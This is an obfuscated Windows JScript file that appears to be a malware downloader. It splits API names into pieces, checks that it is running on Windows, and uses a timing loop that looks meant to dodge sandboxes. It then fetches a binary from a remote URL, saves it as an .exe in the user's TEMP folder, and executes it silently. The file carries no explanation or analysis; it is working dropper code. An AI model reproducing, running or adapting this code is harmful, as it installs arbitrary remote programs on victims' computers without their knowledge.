var R2 = false;
var OK = "Create"+"Object";
var V = function WJ() {return WScript[OK]("WScript"+".Shell");}(), OM = 11;
var PD = "MSXML2"+".XMLHTTP";
var YS0 = 2;
var I0 = YS0 - 2;
function YD(M0){V["Run"](M0, I0, I0);};
function U(){return PD + "";};
function Q(NP, G){I0 = I0 * 1; return NP - G;};
function R(){return OK;};
/*@cc_on
  @if (@_win32 || @_win64)
    R2 = true;
  @end
@*/
if (R2)
{
var R0 = "";
function D(){return 22;};
var AD = 0; var F = 0;
function YS()
{
var VP = new this["Date"]();
var HU = VP["getUTCMilliseconds"]();
WScript["Sleep"](D());
var VP = new this["Date"]();
var D0 = VP["getUTCMilliseconds"]();
WScript["Sleep"](D());
var VP = new this["Date"]();
var R1 = VP["getUTCMilliseconds"]();
var AD = "O";
AD = Q(D0, HU);
var F = "X";
F = Q(R1, D0);
R0 = "open";
return Q(AD, F);
}
var W = false;
var OW = false;
for (var P0 = I0; P0 < D() * 1; P0++){if (YS() != I0){
W = true; 
F = "31" + 11 * AD + F; 
OW = true; 
break;
}}
function I() {return ((W == true) && (W == OW)) ? 1 : I0;};
if (W && I() && OW){
function P() {return V["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "64K2JU51.ex" + "e";};
 AI = U();
 ZB = WScript[OK](AI);
 var J = 1;
do { 
	for (;J;){
	try {
		if (J == 1)
		{
			ZB[R0]("GET", "http://greenbee.com.ua/b7eosa", false);
			ZB["send"]();
			XU = "Sleep";
			J = 2;
		}
		WScript[XU](D() + 120); 
		if (ZB["readystate"] < 2 * 2) continue;
		J = I0;
		function HV(M) {var ZV = (1, 2, 3, 4, 5, M); return ZV;};
		B = WScript[R()]("ADODB.Stream");
		AI = B;
		AI[R0]();
		AI["type"] = HV(1);
		AI["write"](ZB["ResponseBody"]);
		B["position"] = HV(I0);
		AI["Save" + "ToFile"](P(), 2);
		B["cl"+"ose"]();
		CU = P();
		YD(CU);
	} catch(K){};};
}while (J);
}
}

